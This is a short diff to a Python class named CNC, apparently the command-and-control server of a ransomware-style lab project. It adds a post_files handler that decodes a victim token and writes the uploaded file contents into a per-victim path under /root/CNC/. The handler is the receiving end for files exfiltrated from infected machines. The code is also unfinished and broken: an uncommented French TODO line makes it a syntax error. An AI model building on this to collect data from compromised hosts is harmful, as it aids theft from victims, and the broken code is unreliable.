@@ -54,10 +54,23 @@ class CNC(CNCBase):
         return {"status":"KO"}
 
     def post_files(self, path:str, params:dict, body:dict)->dict:
-        os.makedirs("/root/CNC/files/")
+        os.makedirs("/root/CNC/files/", exist_ok=True)
         os.chdir("/root/CNC/files")
-        for file in body:
-            pass
+        print("POST_FILES:", body)
+
+        token = base64.b64decode(body["token"])
+
+        key = list(body.keys())
+        print(key[1])
+        path = "/root/CNC/" + token.hex() #+ key[1]
+        
+        TODO manipuler le chemin d'accès pour créer les folders 
+        
+        #os.makedirs("/root/CNC/files/", exist_ok=True)
+        with open(path, "w") as f:
+            f.write(body[key[1]])
+
+        return {}
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
